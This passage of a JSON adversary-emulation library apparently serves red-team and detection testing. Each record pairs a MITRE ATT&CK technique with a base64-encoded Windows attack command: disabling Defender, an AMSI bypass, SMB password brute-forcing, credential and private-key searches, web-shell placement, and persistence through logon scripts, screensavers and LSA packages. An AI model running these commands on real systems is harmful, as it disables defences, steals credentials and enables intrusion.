"c3RhcnQgcG93ZXJzaGVsbC5leGUgLUFyZ3VtZW50TGlzdCAiLU5vUCIsIi1TdEEiLCItRXhlY3V0aW9uUG9saWN5IiwiYnlwYXNzIiwiLlxFbXVsYXRlLUFkbWluaXN0cmF0b3ItVGFza3MucHMxIg==", "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Emulate Administrator Tasks", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["Emulate-Administrator-Tasks.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICIuXEVtdWxhdGUtQWRtaW5pc3RyYXRvci1UYXNrcy5wczEi", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJFbXVsYXRlLUFkbWluaXN0cmF0b3ItVGFza3MucHMxIg=="], "executor": "psh", "access": {}, "description": "Emulate administrator tasks on a system in a separate process", "variations": []}, {"test": "JHVybCA9ICdodHRwczovL2dpdGh1Yi5jb20vcmVkY2FuYXJ5Y28vYXRvbWljLXJlZC10ZWFtL3Jhdy9tYXN0ZXIvYXRvbWljcy9UMTU2Ni4wMDEvYmluL1BoaXNoaW5nQXR0YWNobWVudC54bHNtJzsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsIC1PdXRGaWxlICRlbnY6VEVNUFxQaGlzaGluZ0F0dGFjaG1lbnQueGxzbQ==", "ability_id": "1afaec09315ab71fdfb167175e8a019a", "technique_name": "Phishing: Spearphishing Attachment", "additional_info": {}, "privilege": "", "technique_id": "T1566.001", "platform": "windows", "name": "Download Macro-Enabled Phishing Attachment", "requirements": [], "tactic": "initial-access", "buckets": ["initial-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFBoaXNoaW5nQXR0YWNobWVudC54bHNtIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n", "variations": []}, {"test": "JHggPSBHZXQtUHJvY2VzcyB8IFdoZXJlLU9iamVjdCB7JF8uTWFpbldpbmRvd1RpdGxlIC1uZSAiIn0gfCBTZWxlY3QtT2JqZWN0IE1haW5XaW5kb3dUaXRsZTskYSA9IE5ldy1PYmplY3QgLWNvbSAiU2hlbGwuQXBwbGljYXRpb24iOyAkYiA9ICRhLndpbmRvd3MoKSB8IHNlbGVjdC1vYmplY3QgTG9jYXRpb25OYW1lO3dyaXRlLWhvc3QgKCR4IHwgRm9ybWF0LUxpc3QgfCBPdXQtU3RyaW5nKSAoJGIgfCBGb3JtYXQtTGlzdCB8IE91dC1TdHJpbmcp", "ability_id": "5c65eec8-4839-4713-a4e1-86b2e75d1927", "technique_name": "Application Window Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1010", "platform": "windows", "name": "Application Window Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.", "variations": []}, {"test": "SW52b2tlLUFUSENvbXBpbGVkSGVscCAtRXhlY3V0ZVNob3J0Y3V0Q29tbWFuZCAtSW5mb1RlY2hTdG9yYWdlSGFuZGxlciBpdHMgLVRvcGljRXh0ZW5zaW9uIGh0bWwgLUhIRmlsZVBhdGggJGVudjp3aW5kaXJcaGguZXhlIC1DSE1GaWxlUGF0aCBUZXN0LmNobQ==", "ability_id": "aa4c0ef131be308c9fb61782afe15a45", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Invoke CHM Shortcut Command with ITS and Help Topic", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.", "variations": []}, {"test": "JFNhbUFjY291bnROYW1lID0gJ1QxMTM2LjAwMl9BZG1pbic7ICRBY2NvdW50UGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdUMTEzNl9wYXNzMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZTsgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQ7ICRDb250ZXh0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQgLUFyZ3VtZW50TGlzdCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Db250ZXh0VHlwZV06OkRvbWFpbik7ICRVc2VyID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWwgLUFyZ3VtZW50TGlzdCAoJENvbnRleHQpOyAkVXNlci5TYW1BY2NvdW50TmFtZSA9ICRTYW1BY2NvdW50TmFtZTsgJFRlbXBDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnYScsICRBY2NvdW50UGFzc3dvcmQpOyAkVXNlci5TZXRQYXNzd29yZCgkVGVtcENyZWQuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCk7ICRVc2VyLkVuYWJsZWQgPSAkVHJ1ZTsgJFVzZXIuUGFzc3dvcmROb3RSZXF1aXJlZCA9ICRGYWxzZTsgJFVzZXIuRGlzcGxheU5hbWUgPSAkU2FtQWNjb3VudE5hbWU7ICRVc2VyLlNhdmUoKTsgJFVzZXI=", "ability_id": "9daf17b5f56ce029f96a224173c95cea", "technique_name": "Create Account: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1136.002", "platform": "windows", "name": "Create a new Domain Account using PowerShell", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["Y21kIC9jICJuZXQgdXNlciBUMTEzNi4wMDJfQWRtaW4gL2RlbCA+bnVsIDI+JjEi"], "executor": "psh", "access": {}, "description": "Creates a new Domain User using the credentials of the Current User\n", "variations": []}, {"test": "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUgIiVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxldmlsc2NyZWVuc2F2ZXIuc2NyIiAmJiByZWcuZXhlIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcQ29udHJvbCBQYW5lbFxEZXNrdG9wIiAvdiBTY3JlZW5TYXZlQWN0aXZlIC90IFJFR19TWiAvZCAxIC9mICYmIHJlZy5leGUgYWRkICJIS0VZX0NVUlJFTlRfVVNFUlxDb250cm9sIFBhbmVsXERlc2t0b3AiIC92IFNjcmVlblNhdmVUaW1lb3V0IC90IFJFR19TWiAvZCA2MCAvZiAmJiByZWcuZXhlIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcQ29udHJvbCBQYW5lbFxEZXNrdG9wIiAvdiBTY3JlZW5TYXZlcklzU2VjdXJlIC90IFJFR19TWiAvZCAwIC9mICYmIHJlZy5leGUgYWRkICJIS0VZX0NVUlJFTlRfVVNFUlxDb250cm9sIFBhbmVsXERlc2t0b3AiIC92IFNDUk5TQVZFLkVYRSAvdCBSRUdfU1ogL2QgIiVTeXN0ZW1Sb290JVxTeXN0ZW0zMlxldmlsc2NyZWVuc2F2ZXIuc2NyIiAvZiAmJiBzaHV0ZG93biAvciAvdCAw", "ability_id": "1a5bb2c5c5ee39b2ef3b4f524479cdbf", "technique_name": "Event Triggered Execution: Screensaver", "additional_info": {}, "privilege": "", "technique_id": "T1546.002", "platform": "windows", "name": "Set Arbitrary Binary as Screensaver", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n", "variations": []}, {"test": "ZWNobyBQYXNzd29yZDE+IHBhc3N3b3Jkcy50eHQgJiYgZWNobyAxcTJ3M2U0cj4+IHBhc3N3b3Jkcy50eHQgJiYgZWNobyBQYXNzd29yZCE+PiBwYXNzd29yZHMudHh0ICYmIGVjaG8gU3ByaW5nMjAyMj4+IHBhc3N3b3Jkcy50eHQgJiYgZWNobyBDaGFuZ2VNZSE+PiBwYXNzd29yZHMudHh0ICYmIEBGT1IgL0YgImRlbGltcz0iICVwIGluIChwYXNzd29yZHMudHh0KSBETyBAbmV0IHVzZSAlbG9nb25zZXJ2ZXIlXElQQyQgL3VzZXI6IiV1c2VyZG9tYWluJVwje3VzZXJ9IiAiJXAiIDE+TlVMIDI+JjEgJiYgQGVjaG8gWypdICN7dXNlcn06JXAgJiYgQG5ldCB1c2UgL2RlbGV0ZSAlbG9nb25zZXJ2ZXIlXElQQyQgPiBOVUw=", "ability_id": "1495dd9c92cba48cd54d0c93c07348aa", "technique_name": "Brute Force: Password Guessing", "additional_info": {}, "privilege": "", "technique_id": "T1110.001", "platform": "windows", "name": "Brute Force Credentials of single Active Directory domain users via SMB", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n", "variations": []}, {"test": "eGNvcHkgL0kgL1kgUGF0aFRvQXRvbWljc0ZvbGRlclxUMTUwNS4wMDNcc3JjXCBDOlxpbmV0cHViXHd3d3Jvb3Q=", "ability_id": "d8a5c2c6978d0a9b03cfe26b6ec875a9", "technique_name": "Server Software Component: Web Shell", "additional_info": {}, "privilege": "", "technique_id": "T1505.003", "platform": "windows", "name": "Web Shell Written to Disk", "requirements": [], "tactic": "persistence", "buckets": ["persistence"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIEM6XGluZXRwdWJcd3d3cm9vdFxiLmpzcCAvcSA+bnVsIDI+JjEgJiYgZGVsIEM6XGluZXRwdWJcd3d3cm9vdFx0ZXN0cy5qc3AgL3EgPm51bCAyPiYxICYmIGRlbCBDOlxpbmV0cHViXHd3d3Jvb3RcY21kLmFzcHggL3EgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n", "variations": []}, {"test": "ZGlyIGM6XCAvYiAvcyAua2V5IHwgZmluZHN0ciAvZSAua2V5", "ability_id": "e16297dffb68b5ffa5b243243233cd1c", "technique_name": "Unsecured Credentials: Private Keys", "additional_info": {}, "privilege": "", "technique_id": "T1552.004", "platform": "windows", "name": "Private Keys", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n", "variations": []}, {"test": "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAxOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nIDE7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3JpcHRTY2FubmluZyAxOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmxvY2tBdEZpcnN0U2VlbiAx", "ability_id": "f0fde90a3d59061b226197974e7dcbaa", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Tamper with Windows Defender ATP PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAwOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nIDA7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3JpcHRTY2FubmluZyAwOyBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmxvY2tBdEZpcnN0U2VlbiAw"], "executor": "psh", "access": {}, "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n", "variations": []}, {"test": "JGV4cGxvcmVyID0gR2V0LVByb2Nlc3MgLU5hbWUgZXhwbG9yZXI7bWF2aW5qZWN0LmV4ZSAkZXhwbG9yZXIuaWQgQzpcVXNlcnNcUHVibGljXHNhbmRjYXQuZGxs", "ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81", "technique_name": "Process Injection: Portable Executable Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055.002", "platform": "windows", "name": "Signed Binary Execution - Mavinject", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Leverage Mavinject (signed binary) for DLL injection", "variations": []}, {"test": "YXR0cmliLmV4ZSAtciAldGVtcCVcVDEyMjIuMDAxX2F0dHJpYlwqLiogL3M=", "ability_id": "bd98d9b643b44bbbf26e1a48ae94b68b", "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "additional_info": {}, "privilege": "", "technique_id": "T1222.001", "platform": "windows", "name": "attrib - Remove read-only attribute", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n", "variations": []}, {"test": "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp", "ability_id": "34952e2eefd3066c5f574744e1734ca6", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "AMSI Bypass - AMSI InitFailed", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJGZhbHNlKQ=="], "executor": "psh", "access": {}, "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n", "variations": []}, {"test": "IkM6XFByb2dyYW0gRmlsZXNcT3JhY2xlXFZpcnR1YWxCb3hcVkJveFNWQy5leGUiIC9yZXJlZ3NlcnZlciAmJiByZWdzdnIzMiAvUyAiQzpcUHJvZ3JhbSBGaWxlc1xPcmFjbGVcVmlydHVhbEJveFxWYm94Qy5kbGwiICYmIHJ1bmRsbDMyICJDOlxQcm9ncmFtIEZpbGVzXE9yYWNsZVxWaXJ0dWFsQm94XFZCb3hSVC5kbGwsUlRSM0luaXQiICYmIHNjIGNyZWF0ZSBWQm94RFJWIGJpbnBhdGg9ICJDOlxQcm9ncmFtIEZpbGVzXE9yYWNsZVxWaXJ0dWFsQm94XGRyaXZlcnNcVmJveERydi5zeXMiIHR5cGU9IGtlcm5lbCBzdGFydD0gYXV0byBlcnJvcj0gbm9ybWFsIGRpc3BsYXluYW1lPSBQb3J0YWJsZVZCb3hEUlYgJiYgc2Mgc3RhcnQgVkJveERSVg==", "ability_id": "2e0a44f9919a362689beea79fbf485a9", "technique_name": "Run Virtual Instance", "additional_info": {}, "privilege": "", "technique_id": "T1564.006", "platform": "windows", "name": "Register Portable Virtualbox", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["8af345_Virtualbox_52.msi"], "cleanup": ["c2Mgc3RvcCBWQm94RFJWICYmIHNjIGRlbGV0ZSBWQm94RFJWICYmIHJlZ3N2cjMyIC91IC9TICJDOlxQcm9ncmFtIEZpbGVzXE9yYWNsZVxWaXJ0dWFsQm94XFZib3hDLmRsbCIgJiYgbXNpZXhlYyAveCA4YWYzNDVfVmlydHVhbGJveF81Mi5tc2kgL3Fu"], "executor": "cmd", "access": {}, "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n", "variations": []}, {"test": "Y29weSAld2luZGlyJVxTeXN0ZW0zMlx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlICVBUFBEQVRBJVx0YXNraG9zdHcuZXhlIC9ZICYmIGNtZC5leGUgL0sgJUFQUERBVEElXHRhc2tob3N0dy5leGU=", "ability_id": "f82efa1ac00819fe5260af67800cbdcb", "technique_name": "Masquerading: Rename System Utilities", "additional_info": {}, "privilege": "", "technique_id": "T1036.003", "platform": "windows", "name": "Masquerading - powershell.exe running as taskhostw.exe", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC9RIC9GICVBUFBEQVRBJVx0YXNraG9zdHcuZXhlID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n\nUpon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.\n", "variations": []}, {"test": "Y3NjcmlwdCBkMDZkZWJfZ3JpZmZvbl9yZWNvbi52YnM=", "ability_id": "53b7fd7256549c9259d4f98f0a44d78b", "technique_name": "System Information Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1082", "platform": "windows", "name": "Griffon Recon", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["d06deb_griffon_recon.vbs"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJkMDZkZWJfZ3JpZmZvbl9yZWNvbi52YnMi"], "executor": "psh", "access": {}, "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)", "variations": []}, {"test": "R2V0LUNoaWxkSXRlbSAkZW52OlRFTVBcVDE1NTEuMDA2X3RpbWVzdG9tcC50eHQgfCAlIHsgJF8uTGFzdFdyaXRlVGltZSA9ICIwMS8wMS8xOTcwIDAwOjAwOjAwIiB9", "ability_id": "494362bbb19ada4adcd336754c043390", "technique_name": "Indicator Removal on Host: Timestomp", "additional_info": {}, "privilege": "", "technique_id": "T1070.006", "platform": "windows", "name": "Windows - Modify file last modified timestamp with PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxNTUxLjAwNl90aW1lc3RvbXAudHh0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n", "variations": []}, {"test": "ZGlyIC9zIC9iICVVU0VSUFJPRklMRSVcRmF2b3JpdGVz", "ability_id": "69bbe2183fa09c00ccaac62d48e214f8", "technique_name": "Browser Bookmark Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1217", "platform": "windows", "name": "List Internet Explorer Bookmarks using the command prompt", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder", "variations": []}, {"test": "Z2V0LWFjbCBSRUdJU1RSWTo6SEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcKiB8Rkw7IGdldC1hY2wgUkVHSVNUUlk6OkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXHdlYWtzZXJ2aWNlbmFtZSB8Rkw=", "ability_id": "c240b81112d5652659a74aadd862256b", "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness", "additional_info": {}, "privilege": "", "technique_id": "T1574.011", "platform": "windows", "name": "Service Registry Permissions Weakness", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n", "variations": []}, {"test": "Q29weS1JdGVtIDg2NGQ0N19wYWNrYWdlLmRsbCBDOlxXaW5kb3dzXFN5c3RlbTMyXDsgcmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExzYSIgL3YgIkF1dGhlbnRpY2F0aW9uIFBhY2thZ2VzIiAvdCBSRUdfTVVMVElfU1ogL2QgIm1zdjFfMFwwcGFja2FnZS5kbGwiIC9m", "ability_id": "2f8f26ef6caacf086dd9b7f7b5031fa5", "technique_name": "Authentication Package", "additional_info": {}, "privilege": "", "technique_id": "T1547.002", "platform": "windows", "name": "Authentication Package", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["864d47_package.dll"], "cleanup": ["cmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExzYSIgL3YgIkF1dGhlbnRpY2F0aW9uIFBhY2thZ2VzIiAvdCBSRUdfTVVMVElfU1ogL2QgIm1zdjFfMCIgL2Y7IHJtIC1mb3JjZSBDOlx3aW5kb3dzXHN5c3RlbTMyXHBhY2thZ2UuZGxs", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4NjRkNDdfcGFja2FnZS5kbGwi"], "executor": "psh", "access": {}, "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n", "variations": []}, {"test": "cmVnIHF1ZXJ5IEhLQ1UgL2YgcGFzc3dvcmQgL3QgUkVHX1NaIC9z", "ability_id": "3aad5312-d48b-4206-9de4-39866c12e60f", "technique_name": "Unsecured Credentials: Credentials in Registry", "additional_info": {}, "privilege": "", "technique_id": "T1552.002", "platform": "windows", "name": "Credentials in Registry - HKCU", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Search for possible credentials stored in Registry", "variations": []}, {"test": "aWNhY2xzLmV4ZSAje2ZpbGVfb3JfZm9sZGVyfSAvZ3JhbnQgI3t1c2VyX29yX2dyb3VwfTpG", "ability_id": "eae889b6c1b6ab2611eac5b2015fcb17", "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "additional_info": {}, "privilege": "", "technique_id": "T1222.001", "platform": "windows", "name": "cacls - Grant permission to specified user or group recursively", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n", "variations": []}, {"test": "ZWNobyAiZWNobyBBcnQgIkxvZ29uIFNjcmlwdCIgYXRvbWljIHRlc3Qgd2FzIHN1Y2Nlc3NmdWwuID4+ICVVU0VSUFJPRklMRSVcZGVza3RvcFxUMTAzNy4wMDEtbG9nLnR4dCIgPiAldGVtcCVcYXJ0LmJhdCAmJiBSRUcuZXhlIEFERCBIS0NVXEVudmlyb25tZW50IC92IFVzZXJJbml0TXByTG9nb25TY3JpcHQgL3QgUkVHX1NaIC9kICIldGVtcCVcYXJ0LmJhdCIgL2Y=", "ability_id": "62cfa90fb03a6bc1a6ebcce8a3ea81b7", "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)", "additional_info": {}, "privilege": "", "technique_id": "T1037.001", "platform": "windows", "name": "Logon Scripts", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UkVHLmV4ZSBERUxFVEUgSEtDVVxFbnZpcm9ubWVudCAvdiBVc2VySW5pdE1wckxvZ29uU2NyaXB0IC9mID5udWwgMj4mMSAmJiBkZWwgJXRlbXAlXGFydC5iYXQgPm51bCAyPiYxICYmIGRlbCAiJVVTRVJQUk9GSUxFJVxkZXNrdG9wXFQxMDM3LjAwMS1sb2cudHh0IiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n", "variations": []}, {"test": "bmV0IHVzZXIgZ3Vlc3QgL2FjdGl2ZTp5ZXM=", "ability_id": "d0ca00832890baa1d42322cf70fcab1a", "technique_name": "Valid Accounts: Default Accounts", "additional_info": {}, "privilege": "", "technique_id": "T1078.001", "platform": "windows", "name": "Activate Guest Account", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bmV0IHVzZXIgZ3Vlc3QgL2FjdGl2ZTpubw=="], "executor": "cmd", "access": {}, "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n", "variations": []}, {"test": "Qzpcd2luZG93c1xzeXN0ZW0zMlxTeW5jQXBwdlB1Ymxpc2hpbmdTZXJ2ZXIudmJzICJcbjtTdGFydC1Qcm9jZXNzIGNhbGMi", "ability_id": "add2a6b902c2d3c7d55228206f312f5a", "technique_name": "Signed Script Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1216", "platform": "windows", "name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n", "variations": []}, {"test": "U2V0LUxvY2F0aW9uIFBhdGhUb0F0b21pY3NGb2xkZXI7IC5cVDEwNzEuMDA0XHNyY1xUMTA3MS1kbnMtZG9tYWluLWxlbmd0aC5wczEgLURvbWFpbiAxMjcuMC4wLjEueGlwLmlvIC1TdWJkb21haW4gYXRvbWljcmVkdGVhbWF0b21pY3JlZHRlYW1hdG9taWNyZWR0ZWFtYXRvbWljcmVkdGVhbWF0b21pY3JlZHRlIC1RdWVyeVR5cGUgVFhU", "ability_id": "75cb0aef7266540c6404916e25fc2ddb", "technique_name": "Application Layer Protocol: DNS", "additional_info": {}, "privilege": "", "technique_id": "T1071.004", "platform": "windows", "name": "DNS Long Domain Query", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": 